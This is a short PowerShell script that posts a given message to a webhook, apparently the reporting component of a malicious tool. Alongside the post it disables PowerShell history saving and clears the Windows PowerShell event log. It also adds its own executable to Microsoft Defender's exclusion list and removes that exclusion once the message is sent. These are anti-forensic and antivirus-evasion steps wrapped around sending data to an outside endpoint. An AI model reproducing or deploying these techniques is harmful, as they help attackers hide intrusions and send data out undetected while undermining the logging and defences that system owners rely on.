param (
    [string]$Message
)
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$WebhookUrl = "from access section, StatusUpdate"
$scriptPath = $MyInvocation.MyCommand.Path
$exePath = "$scriptPath.exe"
$Exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
if ($Exclusions -notcontains $exePath) {
    Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
}
$Payload = @{
    content = $Message
} | ConvertTo-Json
Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body $Payload
Remove-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue